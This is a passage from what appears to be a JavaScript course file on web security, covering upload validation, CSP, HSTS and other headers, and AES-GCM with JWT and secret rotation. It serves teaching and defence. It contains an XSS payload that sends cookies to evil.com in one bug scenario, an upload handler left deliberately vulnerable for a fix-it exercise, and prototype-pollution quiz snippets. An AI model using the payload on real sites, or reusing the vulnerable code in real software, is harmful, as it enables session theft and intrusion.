     console.log(({}).isAdmin);  // What is printed? ___
  
  c) const cfg = Object.create(null);
     cfg.__proto__ = { isAdmin: true };
     console.log(({}).isAdmin);  // What is printed? ___
     // (Why is this safe?) ___

CHALLENGE 2 — FIX THE VALIDATION GAPS:
  This file upload handler has 5 vulnerabilities. Find and fix them:
  
  app.post('/upload', upload.single('file'), (req, res) => {
    const filename = req.file.originalname;  // Bug 1: no filename sanitization
    const dest = path.join('/uploads', filename); // Bug 2: path traversal possible
    
    // Bug 3: only checks extension, not magic bytes
    if (!filename.endsWith('.jpg') && !filename.endsWith('.png')) {
      return res.status(400).json({ error: 'Only images allowed' });
    }
    
    // Bug 4: no file size limit in validation (only in multer config which may be wrong)
    fs.writeFileSync(dest, req.file.buffer);
    
    // Bug 5: serving files from same origin as app (XSS risk for polyglots)
    res.json({ url: \`https://myapp.com/uploads/\${filename}\` });
  });

CHALLENGE 3 — BUILD FROM SCRATCH:
  Build a secure file upload API with complete validation:
  
  1. Zod schema validation for upload metadata (filename, contentType, size, purpose)
  2. Magic byte validation for: JPEG, PNG, GIF, WebP, PDF
  3. Path traversal safe filename sanitization
  4. Prototype pollution check on all incoming JSON bodies (middleware)
  5. Image re-processing using sharp to strip metadata and polyglot payloads
  6. Store on isolated subdomain (generate URL on uploads.static.example.com, not app domain)
  7. Virus scan integration (ClamAV or VirusTotal API check before accepting)
  8. Rate limit: max 10 uploads per user per hour
  9. Audit log: every upload attempt (success or rejection) with reason
  10. Return structured error responses for each validation failure
    `,
    summary: `Input validation is not optional — frontend validation is decoration, backend validation is security. Zod gives you runtime type safety for all API inputs; prototype pollution requires sanitizing dynamic object keys; file safety requires magic byte checking AND image re-processing (not just extension validation); and path traversal requires path.resolve + boundary check (path.join alone is unsafe). Every byte that crosses your API boundary is potentially adversarial.`
  },

  {
    id: 9,
    title: "Content Security Policy, HSTS & Security Headers",
    tag: "TELLING THE BROWSER WHAT TO TRUST",
    color: "#7C2D12",
    tldr: `HTTP security headers tell browsers how to behave when rendering your pages, blocking categories of attacks before they happen. CSP (Content Security Policy) with nonces prevents XSS by controlling what scripts can execute. HSTS forces HTTPS permanently. Permissions-Policy restricts browser API access (camera, geolocation). These headers are your last line of defence when XSS payloads reach the browser — properly configured, they neutralize entire attack classes.`,
    problem: `
WHY THIS CONCEPT EXISTS / WHAT CONFUSION IT SOLVES:
----------------------------------------------------
"I sanitize user input — do I still need CSP?"
  → Defence in depth. Sanitization fails → CSP prevents execution. Belt AND suspenders.

"CSP blocked my Google Analytics! How do I fix this without using unsafe-inline?"
  → Use nonces or hashes. unsafe-inline defeats the entire purpose of CSP.

"What's the difference between X-Frame-Options and CSP frame-ancestors?"
  → frame-ancestors replaces X-Frame-Options and has better browser support now.

"My site was on the HSTS preload list — now my staging server is broken"
  → HSTS preload is permanent — even without the header, browsers enforce HTTPS.
    Only add to preload list when 100% sure all subdomains have valid HTTPS.

"Permissions-Policy vs Feature-Policy — which do I use?"
  → Permissions-Policy is the new name (Feature-Policy is deprecated). Use Permissions-Policy.

Common production security failures from missing headers:
  - Clickjacking: attacker embeds your app in iframe → user thinks they're clicking on their app
  - XSS via injected script tags despite input sanitization
  - HTTPS downgrade attacks (SSL stripping) before HSTS is established
  - Phishing via your domain using iframe
  - Malicious JS accessing camera/mic via your page
    `,
    analogy: `
THE BUILDING SECURITY RULES ANALOGY:
--------------------------------------
Your web page is a new office building. Security headers are the building's RULES and SIGNS.

CSP (Content Security Policy) = APPROVED VENDOR LIST:
  "Only these contractors are allowed to work in this building."
  "Scripts may only come from cdn.example.com and scripts.google.com."
  "No inline scripts — just like no contractors without ID badges."
  If an XSS attack tries to inject a script from evil.com → BLOCKED. Not on the list.
  
  NONCE = ONE-TIME VISITOR PASS:
  "This specific contractor (this specific <script> tag) has a one-time-use pass: nonce-abc123"
  Each page load generates a new random nonce. Attacker's injected script has no nonce → blocked.

HSTS (HTTP Strict Transport Security) = HTTPS-ONLY BUILDING ENTRY:
  Sign at the entrance: "This building only uses the SECURE entrance for the next 365 days."
  Even if someone tricks you into the HTTP entrance → browser says "No! HTTPS only!"
  HSTS PRELOAD = Built into browser's list of HTTPS-only buildings from day 1.

X-Frame-Options / CSP frame-ancestors = NO WINDOWS INTO OTHER BUILDINGS:
  "Our building cannot be seen through another building's window."
  Prevents clickjacking: attacker can't embed your app in their iframe.

Permissions-Policy = WHAT EQUIPMENT IS ALLOWED IN THE BUILDING:
  "No cameras (camera=()). No microphones (microphone=()). No GPS trackers (geolocation=())."
  If a script tries to access the camera → browser blocks it before even asking the user.

X-Content-Type-Options = NO PRETENDING TO BE SOMETHING ELSE:
  "If a contractor says they're bringing office supplies, the security guard won't let them 
   bring in 'office supplies' that are actually power tools."
  Prevents MIME sniffing: browser won't execute a JS file served as text/plain.
    `,
    deep: `
DEEP TECHNICAL BREAKDOWN — SECURITY HEADERS:
---------------------------------------------

CONTENT SECURITY POLICY (CSP) — RFC 7762:
  HTTP header: Content-Security-Policy: <directives>
  
  Key directives:
  default-src   — fallback for all resource types not explicitly listed
  script-src    — controls JavaScript source
  style-src     — controls CSS source
  img-src       — controls image sources
  connect-src   — controls fetch/XHR/WebSocket destinations
  font-src      — controls font sources
  frame-src     — controls <iframe> sources
  frame-ancestors — controls which pages can embed this page in an iframe
  base-uri      — restricts <base> tag (can redirect all relative URLs!)
  form-action   — restricts where forms can submit
  object-src    — controls <object>, <embed>, <applet> (usually 'none')
  worker-src    — controls Web Workers, Service Workers
  manifest-src  — controls Web App Manifests
  upgrade-insecure-requests — upgrades HTTP sub-resources to HTTPS
  
  Source values:
  'none'                — block everything (most restrictive)
  'self'                — same origin only
  'unsafe-inline'       — allow inline scripts/styles ← DEFEATS XSS protection!
  'unsafe-eval'         — allow eval(), Function() ← also dangerous
  'strict-dynamic'      — trust scripts loaded by trusted scripts (for SPA frameworks)
  'nonce-abc123'        — allow only elements with nonce="abc123" attribute
  'sha256-<hash>'       — allow only elements matching this hash
  https:                — allow any HTTPS source (too permissive)
  cdn.example.com       — allow this specific host

CSP NONCE FLOW:
  1. Server generates cryptographically random nonce per request (16+ bytes, base64 encoded)
  2. Server includes nonce in CSP header: Content-Security-Policy: script-src 'nonce-abc123'
  3. Server adds nonce to every <script> and <style> tag in the HTML:
     <script nonce="abc123" src="/app.js"></script>
  4. Browser executes ONLY scripts with matching nonce
  5. Attacker's injected script: <script src="evil.js"></script> — no nonce → BLOCKED!
  
  Requirements for effective nonce:
  - Cryptographically random (crypto.randomBytes(16).toString('base64'))
  - New nonce per page request (never reuse!)
  - Cannot be guessed or predicted
  - CSP must not also include 'unsafe-inline' (negates nonces in CSP Level 2)
  
  CSP HASH alternative:
  For static inline scripts, hash the content:
  sha256 of: console.log('analytics')
  → CSP: script-src 'sha256-<base64-hash>'
  Any script with exactly this content is allowed.

CSP REPORT-ONLY MODE:
  Content-Security-Policy-Report-Only: <policy>; report-uri /csp-report
  Browsers report violations without blocking — use to audit before enforcing
  Transition strategy:
  1. Deploy Report-Only mode → collect violations for 1-2 weeks
  2. Fix violations (update CDN allowlists, add nonces)
  3. Switch to enforcing Content-Security-Policy

HSTS (HTTP Strict Transport Security) — RFC 6797:
  Header: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
  
  max-age: seconds to remember HTTPS-only policy (31536000 = 1 year)
  includeSubDomains: apply to all subdomains (*.example.com)
  preload: submit to browser preload lists (see below)
  
  HOW IT WORKS:
  1. First visit (HTTPS): browser receives HSTS header, records domain + max-age
  2. Future HTTP requests: browser upgrades to HTTPS BEFORE sending request
     (attacker never sees any HTTP traffic!)
  3. HSTS failure: if cert is invalid AND HSTS active → browser shows hard error, no "proceed"
  
  HSTS PRELOAD LIST:
  - Maintained by Google (hstspreload.org), shipped in Chrome, Firefox, Safari, Edge
  - If on preload list: HTTPS enforced from first request EVER (no initial HTTP visit needed)
  - Submission requirements: 
    → Must include includeSubDomains
    → Must be on max-age ≥ 31536000 (1 year)  
    → All subdomains must have valid HTTPS
  - REMOVAL: Takes 6-12 months and requires removing the header first, then requesting removal
  
  GOTCHA: Never add preload if ANY subdomain is HTTP-only.
    legacy.example.com on HTTP? → After preload, legacy.example.com completely unreachable.

OTHER CRITICAL SECURITY HEADERS:
  
  X-Content-Type-Options: nosniff
    Prevents browser from MIME-type sniffing (executing a JS file served as text/html)
    Always set this. No exceptions.
  
  X-Frame-Options: DENY | SAMEORIGIN
    DENY: no framing anywhere
    SAMEORIGIN: only same origin can frame
    Deprecated in favor of CSP frame-ancestors but still add for old browsers
  
  Referrer-Policy: strict-origin-when-cross-origin
    Controls what's in the Referer header
    strict-origin-when-cross-origin: send full URL for same-origin, only origin for cross-origin
    no-referrer: never send Referer (maximum privacy)
    Prevents leaking sensitive URLs (e.g., /admin/users/123 in Referer to third-party)
  
  Permissions-Policy (formerly Feature-Policy):
    Format: Permissions-Policy: camera=(), microphone=(), geolocation=(self)
    camera=()           — block camera API for all frames including self
    microphone=(self)   — allow microphone for same-origin, block for iframes
    geolocation=(self "https://maps.cdn.com") — allow for self and maps CDN
    payment=()          — block Payment Request API
    
    Full list of features (Feb 2024):
    accelerometer, ambient-light-sensor, attribution-reporting, autoplay, battery,
    bluetooth, camera, ch-ua-*, compute-pressure, cross-origin-isolated, display-capture,
    encrypted-media, execution-while-not-rendered, fullscreen, gamepad, geolocation,
    gyroscope, hid, identity-credentials-get, idle-detection, interest-cohort, keyboard-map,
    local-fonts, magnetometer, microphone, midi, navigation-override, payment,
    picture-in-picture, publickey-credentials-create, publickey-credentials-get,
    screen-wake-lock, serial, shared-autofill, speaker-selection, storage-access,
    sync-xhr, usb, window-management, xr-spatial-tracking
  
  Cross-Origin-Opener-Policy: same-origin
    Isolates your browsing context from other origins
    Required for SharedArrayBuffer and high-resolution timers (used for Spectre mitigations)
    Breaks if you open popup windows to different origins
  
  Cross-Origin-Embedder-Policy: require-corp
    With COOP: enables cross-origin isolation
    Requires all sub-resources to opt-in (CORP header) → complex to configure
    `,
    code: `
// ===== SECURITY HEADERS — CODE EXAMPLES =====

// EXAMPLE 1: Comprehensive security headers middleware (Express.js)
const crypto = require('crypto');

function generateNonce() {
  return crypto.randomBytes(16).toString('base64');
}

function securityHeadersMiddleware(req, res, next) {
  // Generate fresh nonce for each request
  const nonce = generateNonce();
  res.locals.cspNonce = nonce; // Available to template engine
  
  // === CONTENT SECURITY POLICY ===
  const csp = [
    \`default-src 'self'\`,
    \`script-src 'self' 'nonce-\${nonce}' https://cdn.jsdelivr.net\`,
    \`style-src 'self' 'nonce-\${nonce}' https://fonts.googleapis.com\`,
    \`img-src 'self' data: https://res.cloudinary.com https://*.amazonaws.com\`,
    \`font-src 'self' https://fonts.gstatic.com\`,
    \`connect-src 'self' https://api.myapp.com wss://ws.myapp.com https://sentry.io\`,
    \`frame-src 'none'\`,                          // No iframes from other origins
    \`frame-ancestors 'none'\`,                    // No one can frame our page
    \`form-action 'self'\`,                        // Forms submit only to self
    \`object-src 'none'\`,                         // No Flash/Java applets
    \`base-uri 'self'\`,                           // Protect <base> tag
    \`upgrade-insecure-requests\`,                 // Force HTTPS sub-resources
    \`report-uri /api/csp-violations\`,            // Report violations
  ].join('; ');
  
  res.setHeader('Content-Security-Policy', csp);
  
  // === HSTS ===
  // Start with 1 hour, increase gradually, then add preload
  res.setHeader('Strict-Transport-Security', 
    'max-age=31536000; includeSubDomains'); // 1 year — add preload only after testing
  
  // === FRAMING PROTECTION ===
  res.setHeader('X-Frame-Options', 'DENY'); // Belt + suspenders (old browsers)
  
  // === MIME TYPE PROTECTION ===
  res.setHeader('X-Content-Type-Options', 'nosniff');
  
  // === REFERRER POLICY ===
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  
  // === PERMISSIONS POLICY ===
  res.setHeader('Permissions-Policy', [
    'camera=()',            // Block camera
    'microphone=()',        // Block microphone
    'geolocation=()',       // Block geolocation
    'payment=(self)',       // Allow Payment API only for self
    'fullscreen=(self)',    // Allow fullscreen only for self
    'interest-cohort=()',   // Opt out of FLoC (privacy)
  ].join(', '));
  
  // === CROSS-ORIGIN HEADERS ===
  res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');
  res.setHeader('Cross-Origin-Resource-Policy', 'same-site');
  
  next();
}

// EXAMPLE 2: Using nonce in template (EJS example)
// Server-side:
function renderPage(req, res) {
  res.render('index', { 
    nonce: res.locals.cspNonce,
    title: 'My Secure App',
  });
}

// In EJS template:
/*
  <script nonce="<%= nonce %>" src="/bundle.js"></script>
  <script nonce="<%= nonce %>">
    // Inline script with nonce — allowed by CSP!
    window.__APP_CONFIG__ = { apiUrl: '/api', env: 'production' };
  </script>
  
  <!-- This injected script would be BLOCKED (no nonce): -->
  <!-- <script>alert('XSS')</script> -->
*/

// EXAMPLE 3: CSP violation reporting endpoint
app.post('/api/csp-violations', express.json({ 
  type: 'application/csp-report' 
}), (req, res) => {
  const report = req.body['csp-report'];
  
  if (!report) return res.status(400).end();
  
  // Log violation for analysis:
  console.log('CSP Violation:', JSON.stringify({
    documentUri: report['document-uri'],
    violatedDirective: report['violated-directive'],
    blockedUri: report['blocked-uri'],
    sourceFile: report['source-file'],
    lineNumber: report['line-number'],
    columnNumber: report['column-number'],
    timestamp: new Date().toISOString(),
    userAgent: req.headers['user-agent'],
  }));
  
  // Alert on unknown blocked URIs (potential attack):
  const knownViolations = ['chrome-extension://', 'moz-extension://']; // Browser extensions
  const isKnown = knownViolations.some(v => report['blocked-uri']?.startsWith(v));
  
  if (!isKnown && report['blocked-uri']) {
    // Potential XSS attempt — alert security team
    console.warn(\`SECURITY ALERT: CSP blocked unknown source: \${report['blocked-uri']}\`);
    // await alertSecurityTeam(report);
  }
  
  res.status(204).end();
});

// EXAMPLE 4: Helmet.js — comprehensive security headers package
// // const helmet = require('helmet'); // npm install helmet

function configureHelmet(app) {
  // app.use(helmet()); // Default settings (good starting point)
  
  // Custom configuration:
  // app.use(helmet({
  //   contentSecurityPolicy: {
  //     directives: {
  //       defaultSrc: ["'self'"],
  //       scriptSrc: ["'self'", (req, res) => \`'nonce-\${res.locals.cspNonce}'\`],
  //       styleSrc: ["'self'", "'unsafe-inline'"],  // Trade-off for CSS frameworks
  //       imgSrc: ["'self'", "data:", "https:"],
  //       connectSrc: ["'self'", "https://api.myapp.com"],
  //       frameSrc: ["'none'"],
  //       objectSrc: ["'none'"],
  //       reportUri: '/api/csp-violations',
  //     },
  //   },
  //   hsts: {
  //     maxAge: 31536000,
  //     includeSubDomains: true,
  //     preload: false, // Only add true when ready for preload list!
  //   },
  //   frameguard: { action: 'deny' },
  //   referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  //   permittedCrossDomainPolicies: false,
  //   crossOriginOpenerPolicy: { policy: 'same-origin' },
  //   crossOriginResourcePolicy: { policy: 'same-site' },
  // }));
}

// EXAMPLE 5: Checking and testing security headers
// Use securityheaders.com or write automated tests:
async function auditSecurityHeaders(url) {
  const response = await fetch(url, { redirect: 'follow' });
  const headers = response.headers;
  
  const checks = {
    'Content-Security-Policy': {
      present: headers.has('content-security-policy'),
      value: headers.get('content-security-policy'),
      checks: [
        { name: 'No unsafe-inline in script-src', 
          pass: !headers.get('content-security-policy')?.includes("'unsafe-inline'") ||
                 headers.get('content-security-policy')?.includes("'nonce-") },
        { name: 'Has default-src', 
          pass: headers.get('content-security-policy')?.includes('default-src') },
        { name: 'Has object-src none',
          pass: headers.get('content-security-policy')?.includes("object-src 'none'") },
      ],
    },
    'Strict-Transport-Security': {
      present: headers.has('strict-transport-security'),
      value: headers.get('strict-transport-security'),
      checks: [
        { name: 'max-age >= 1 year', 
          pass: parseInt(headers.get('strict-transport-security')?.match(/max-age=(\d+)/)?.[1] || '0') >= 31536000 },
        { name: 'Has includeSubDomains',
          pass: headers.get('strict-transport-security')?.includes('includeSubDomains') },
      ],
    },
    'X-Content-Type-Options': {
      present: headers.has('x-content-type-options'),
      value: headers.get('x-content-type-options'),
      checks: [{ name: 'nosniff', pass: headers.get('x-content-type-options') === 'nosniff' }],
    },
    'X-Frame-Options': {
      present: headers.has('x-frame-options'),
      value: headers.get('x-frame-options'),
    },
    'Referrer-Policy': {
      present: headers.has('referrer-policy'),
      value: headers.get('referrer-policy'),
    },
    'Permissions-Policy': {
      present: headers.has('permissions-policy'),
      value: headers.get('permissions-policy'),
    },
  };
  
  let score = 0;
  const total = Object.keys(checks).length;
  
  for (const [header, info] of Object.entries(checks)) {
    const status = info.present ? '✅' : '❌';
    console.log(\`\${status} \${header}: \${info.value || 'MISSING'}\`);
    if (info.present) score++;
    if (info.checks) {
      for (const check of info.checks) {
        console.log(\`   \${check.pass ? '  ✓' : '  ✗'} \${check.name}\`);
      }
    }
  }
  
  console.log(\`\\nSecurity Score: \${score}/\${total} headers present\`);
  return { score, total, checks };
}

// EXAMPLE 6: CSP for Single Page Applications (SPAs)
// SPAs dynamically inject scripts — nonce approach needs adjustment
// Use 'strict-dynamic' for SPAs:
function spaCSP(nonce) {
  return [
    \`script-src 'nonce-\${nonce}' 'strict-dynamic'\`,
    // 'strict-dynamic': scripts loaded by a nonced script are also trusted
    // This allows webpack chunks, dynamic imports to work without allowlisting each URL
    \`object-src 'none'\`,
    \`base-uri 'none'\`,
    // style-src: SPAs often need 'unsafe-inline' for CSS-in-JS — mitigate with:
    \`style-src 'self' 'unsafe-hashes' 'sha256-<hash-of-inline-style>'\`,
  ].join('; ');
}

// EXAMPLE 7: HSTS preload readiness checker
function checkHSTSPreloadReadiness(domain) {
  const issues = [];
  
  // Fetch and check headers:
  // 1. Must redirect HTTP to HTTPS
  // 2. Must serve valid HTTPS  
  // 3. HSTS header must have max-age >= 31536000
  // 4. HSTS must include includeSubDomains
  // 5. HSTS must include preload
  // 6. All subdomains must have valid HTTPS
  
  console.log(\`Checking HSTS preload readiness for \${domain}\`);
  console.log(\`Visit https://hstspreload.org/?domain=\${domain} for official check\`);
  console.log('');
  console.log('Checklist:');
  console.log('  □ HTTP (port 80) redirects to HTTPS');
  console.log('  □ Valid HTTPS certificate (not self-signed, not expired)');
  console.log('  □ HSTS header present on HTTPS response');
  console.log('  □ max-age >= 31536000 (1 year)');
  console.log('  □ includeSubDomains present');
  console.log('  □ preload present');
  console.log('  □ ALL subdomains have valid HTTPS (no HTTP-only subdomains!)');
  console.log('  □ Preload list removal takes months — are you sure?');
}

const express = require('express');
const app = express();
app.use(securityHeadersMiddleware);
    `,
    bugs: `
REAL PRODUCTION BUGS FROM MISSING/MISCONFIGURED SECURITY HEADERS:
------------------------------------------------------------------

BUG 1: XSS via inline script execution — CSP with 'unsafe-inline' completely useless
  Scenario: Team added CSP but developers kept complaining scripts broke → they added 'unsafe-inline'.
    An attacker injected <script>document.location='https://evil.com?c='+document.cookie</script>
    into a comment field. CSP with 'unsafe-inline' allowed the injected script to execute.
  Root cause: 'unsafe-inline' disables the primary XSS protection that CSP provides.
    CSP with 'unsafe-inline' is security theater — provides no meaningful protection.
  Fix: 
    1. Implement nonces for all legitimate inline scripts
    2. Move inline scripts to external files
    3. Use 'strict-dynamic' for SPA dynamic imports
    4. Test CSP in Report-Only mode first to identify all inline scripts that need nonces

BUG 2: HSTS with includeSubDomains breaking internal tools
  Scenario: Added HSTS: max-age=31536000; includeSubDomains to api.company.com
    Two weeks later: developers couldn't access internal.company.com (HTTP-only internal dashboard)
    Browsers remembered HSTS for *.company.com → HTTP to internal was silently upgraded → failed
  Root cause: includeSubDomains applies to ALL subdomains including those not on the HSTS domain.
    Any subdomain of company.com that doesn't have HTTPS becomes unreachable to affected browsers.
  Fix: 
    1. Audit ALL subdomains before enabling includeSubDomains
    2. Either: add HTTPS to all subdomains, OR don't use includeSubDomains
    3. Migrated internal.company.com to HTTPS → issue resolved
  Lesson: includeSubDomains is powerful and permanent (within max-age) — audit first!

BUG 3: CSP nonce being logged and reused
  Scenario: Nonce was generated once at app startup (process-level variable) instead of per-request.
    Same nonce was used for all page loads for hours.
    CSP log showed nonce value → attacker could inject script with the known nonce.
  Root cause: crypto.randomBytes(16) was called once in module scope, not in request handler.
  Fix: Generate nonce inside middleware function (per request), never outside:
    // WRONG: const NONCE = crypto.randomBytes(16).toString('base64'); // Module-level!
    // RIGHT: const nonce = crypto.randomBytes(16).toString('base64'); // Per-request inside fn

BUG 4: Missing X-Content-Type-Options allowing MIME sniffing to XSS
  Scenario: User upload API stored uploaded files. An attacker uploaded a JavaScript file
    with .txt extension. API set Content-Type: text/plain (correct per extension).
    But browser without X-Content-Type-Options: nosniff sniffed the content, identified it
    as JavaScript, and executed it when the "text file" was opened in browser.
  Root cause: Browser MIME sniffing overrode declared Content-Type.
  Fix: X-Content-Type-Options: nosniff prevents browser from MIME sniffing.
    Always set this header. Zero legitimate use case for omitting it.

BUG 5: Permissions-Policy omission allowing malicious ad iframe to access camera
  Scenario: A blog with display ads. An ad iframe included malicious JavaScript that 
    attempted to access the camera. Browser prompted user for camera permission.
    Some users (confused by unfamiliar prompt) granted camera access to the ad.
  Root cause: No Permissions-Policy header → iframes could request camera access.
  Fix: Permissions-Policy: camera=(), microphone=(), geolocation=()
    This blocks camera/mic/geolocation API for the entire page INCLUDING iframes.
    Ad networks legitimately don't need camera access — denying is always correct.
    `,
    challenge: `
CHALLENGES:
-----------

CHALLENGE 1 — ANALYZE THE CSP:
  Given this CSP header, answer the questions:
  Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 
  https://cdn.jquery.com; img-src *; style-src 'self' 'unsafe-inline'
  
  a) Can an attacker's injected <script>alert(1)</script> execute? _____ Why? _____
  b) Can an image from https://evil.com/tracker.gif load? _____ Why? _____
  c) Can a fetch() to https://api.external.com succeed? _____ Why? _____
  d) Can your own <script src="/app.js"> load? _____ Why? _____
  e) What is the most critical vulnerability in this CSP? _____
  f) Rewrite this CSP to be secure, assuming you can add nonces.

CHALLENGE 2 — FIX THE SECURITY HEADERS:
  This middleware has 6 security issues. Identify and fix them:
  
  app.use((req, res, next) => {
    // Issue 1: Nonce generated once (module-level, not per request)
    res.setHeader('Content-Security-Policy', \`script-src 'nonce-\${STATIC_NONCE}'\`);
    
    // Issue 2: HSTS max-age too short, no includeSubDomains
    res.setHeader('Strict-Transport-Security', 'max-age=300');
    
    // Issue 3: X-Frame-Options missing entirely
    
    // Issue 4: X-Content-Type-Options missing entirely
    
    // Issue 5: Referrer-Policy missing (leaks URLs to third parties)
    
    // Issue 6: CSP allows * for images (allows tracking pixels from any domain)
    res.setHeader('Content-Security-Policy', "img-src *");
    
    next();
  });
  const STATIC_NONCE = 'abc123'; // Module-level (WRONG!)

CHALLENGE 3 — BUILD FROM SCRATCH:
  Build a complete security headers middleware system:
  
  1. Per-request nonce generation using crypto.randomBytes
  2. Environment-aware CSP:
     - Development: permissive (allow localhost, hot-reload WebSockets)  
     - Staging: same as production but report-only mode
     - Production: full enforcement with nonces
  3. CSP violation reporting endpoint that:
     - Stores violations in database
     - Alerts on novel blocked URIs (potential attack)
     - Provides dashboard showing top violations, trends, sources
  4. HSTS readiness checker that audits all configured domains
  5. Security headers audit test suite that:
     - Makes test requests to your app
     - Validates all required headers are present and correctly configured
     - Fails CI build if security score drops below threshold
  6. Nonce propagation to React/EJS/Handlebars templates
  7. Documentation generator: auto-generates explanation of your CSP for security audits
    `,
    summary: `Security headers are your browser-enforced last line of defence — when XSS payloads reach the browser, CSP with nonces prevents them from executing; HSTS ensures HTTPS is used before the first byte is sent; Permissions-Policy prevents malicious code from accessing device APIs. Always generate nonces per request (never reuse), never use 'unsafe-inline' in CSP, test HSTS with includeSubDomains on all subdomains before enabling, and use Permissions-Policy to deny all browser APIs you don't explicitly need.`
  },

  {
    id: 10,
    title: "Encryption at Rest, JWT Rotation & Secret Management",
    tag: "PROTECTING DATA WHEN IT'S SITTING STILL",
    color: "#1E3A5F",
    tldr: `Encryption at rest protects data in databases, disks, and backups from physical theft or unauthorized access. AES-256-GCM provides authenticated encryption (confidentiality + integrity). JWT key rotation lets you change signing keys without invalidating all sessions. Zero-downtime secret rotation and CI/CD secret scanning prevent the most common production security failures: leaked credentials and expired/rotated secrets causing outages.`,
    problem: `
WHY THIS CONCEPT EXISTS / WHAT CONFUSION IT SOLVES:
----------------------------------------------------
"Our database is behind a VPN — why encrypt at rest?"
  → VPN protects network. Encryption at rest protects: stolen disk, backup exfiltration,
    rogue DBA, cloud provider compromise, snapshot copying, debug log leaks.

"What's the difference between AES-CBC and AES-GCM?"
  → CBC: encryption only (no integrity). GCM: encryption + authentication tag.
    CBC without MAC is vulnerable to padding oracle attacks. Always use GCM.

"I rotate JWT secrets — why do logged-in users get logged out?"
  → If you replace the secret, old JWTs can't be verified. Use key IDs (kid header)
    and keep old keys for verification during grace period.

"Our prod went down because someone rotated a database password"
  → Zero-downtime rotation: update secret in vault → deploy app reading new secret →
    revoke old secret. Never change secret and revoke old in one step.

"A developer pushed AWS keys to GitHub — how do I respond?"
  → Assume compromised. Rotate immediately. Check CloudTrail for usage.
    Then: implement secret scanning in CI/CD to prevent future leaks.
    `,
    analogy: `
THE SAFE DEPOSIT BOX ANALOGY:
------------------------------
AES-256-GCM ENCRYPTION AT REST = SAFE DEPOSIT BOX WITH TAMPER SEAL:
  Your data (plaintext) is locked in a safe deposit box (AES encryption).
  The box has a tamper seal (authentication tag — GCM).
  Key: your encryption key (keep it separate from the data!).
  
  If someone steals the box (copies your database): they can't open it without the key.
  If someone tampers with the box (modifies encrypted data): the tamper seal breaks.
  
  AES-256: 256-bit key. 2^256 possible keys. Even with every computer on Earth, 
    brute forcing takes longer than the age of the universe.
  GCM mode: Galois/Counter Mode — produces a 16-byte "authentication tag".
    If even one bit of ciphertext changes: decryption fails with auth error.

JWT KEY ROTATION = CHANGING LOCKER COMBINATIONS:
  Your gym has lockers with combination locks. JWTs are membership cards.
  Key ID (kid) = the locker NUMBER printed on the card.
  "Use locker #5's combination to verify this card."
  
  When you rotate: 
    New cards get "locker #6" printed → new combination.
    Old cards still say "locker #5" → old combination still works until they expire.
    Both combinations work simultaneously → zero downtime!
    After all old cards expire: decommission locker #5.

SECRET ROTATION = CHANGING BUILDING KEY CARDS:
  Old card works → issue new card → update all doors to accept new card →
  confirm new card works → deactivate old card.
  NEVER: deactivate old card before new card works. That's a lockout (outage).

CI/CD SECRET SCANNING = AIRPORT METAL DETECTOR:
  Every commit goes through the detector.
  If you accidentally pack a weapon (API key in code) → BLOCKED before it flies.
  Alert immediately, auto-revoke if possible.
    `,
    deep: `
DEEP TECHNICAL BREAKDOWN — ENCRYPTION AND SECRET MANAGEMENT:
-------------------------------------------------------------

AES-256-GCM ENCRYPTION:
  AES (Advanced Encryption Standard): symmetric block cipher (same key to encrypt/decrypt)
  256: key size in bits (AES supports 128, 192, 256 — use 256 for maximum security)
  GCM (Galois/Counter Mode): mode of operation — how AES encrypts data longer than 128 bits
  
  AES-GCM components:
  Key:          256-bit (32 bytes) — must be random, must be secret
  IV/Nonce:     96-bit (12 bytes) — MUST be unique per encryption operation
                Never reuse IV+Key combination! Reuse breaks confidentiality AND authenticity.
  Plaintext:    data to encrypt
  AAD:          Additional Authenticated Data — not encrypted, but authenticated
                Use for metadata you want to bind to the ciphertext (table name, user ID)
  Ciphertext:   encrypted data (same length as plaintext)
  Auth Tag:     16 bytes — HMAC-like tag verifying both ciphertext and AAD integrity
  
  Encryption output: IV (12B) + Ciphertext + Auth Tag (16B)
  Store these together — you need all three to decrypt.
  
  Security properties:
  Confidentiality: Without key, cannot recover plaintext
  Integrity: Any modification to ciphertext/AAD → auth tag verification fails
  Authenticity: Proves ciphertext was created by someone with the key
  
  WHAT AES-GCM DOES NOT PROVIDE:
  - Key management (your problem)
  - Protection if key is leaked
  - Hiding WHICH data was encrypted or WHEN
  
  ENVELOPE ENCRYPTION (AWS KMS/GCP KMS pattern):
  Problem: Encrypting millions of DB rows with one key → key rotation encrypts everything again
  Solution:
    1. Generate a Data Encryption Key (DEK) — unique per record or per batch
    2. Encrypt data with DEK (AES-256-GCM — fast)
    3. Encrypt DEK with Key Encryption Key (KEK) stored in KMS — called "wrapping"
    4. Store encrypted DEK alongside encrypted data
  Rotation: Rotate KEK in KMS → re-wrap DEKs (fast) → no need to re-encrypt all data!

JWT KEY ROTATION WITH KID (Key ID):
  JWT Header: { "alg": "RS256", "typ": "JWT", "kid": "key-2024-01" }
  
  Multi-key setup:
  1. Maintain JWKS (JSON Web Key Set) endpoint: GET /.well-known/jwks.json
     Returns ALL currently valid public keys, each with a unique "kid"
  2. On JWT creation: sign with current (latest) private key, include kid in header
  3. On JWT verification: 
     - Extract kid from token header
     - Look up corresponding key from JWKS
     - Verify signature with that specific key
  4. Rotation:
     - Generate new key pair
     - Add new public key to JWKS, keep old key in JWKS
     - Start signing new tokens with new private key
     - Wait until all old tokens expire (or max-age window)
     - Remove old public key from JWKS
  
  Key rotation frequencies:
  Compliance: many standards require quarterly or annual rotation
  After incident: immediately if private key compromised
  Automated: use HashiCorp Vault's PKI backend to auto-rotate on schedule
  
  Grace period = JWT expiry time (e.g., 24h)
  After rotation: keep old key for 24h → all old tokens expire → remove old key

ZERO-DOWNTIME SECRET ROTATION PROTOCOL:
  1. PRE-ROTATION:
     - All app instances reading secret from vault/env
     - Secret version: v1
  
  2. GENERATE NEW SECRET:
     - Generate strong new secret (not derived from old)
     - Add to vault/secret manager as version v2
  
  3. UPDATE APPLICATION:
     - Deploy new version that reads BOTH v1 and v2
     - Or: update app to read v2 (vault provides v2 as default)
     - Verify app works with new secret in staging first
  
  4. GRACE PERIOD:
     - Run with both versions valid (for DBs: accept connections with either password)
     - For JWTs: both keys in JWKS
     - For API keys: service validates against both
  
  5. REVOKE OLD:
     - After grace period: revoke v1
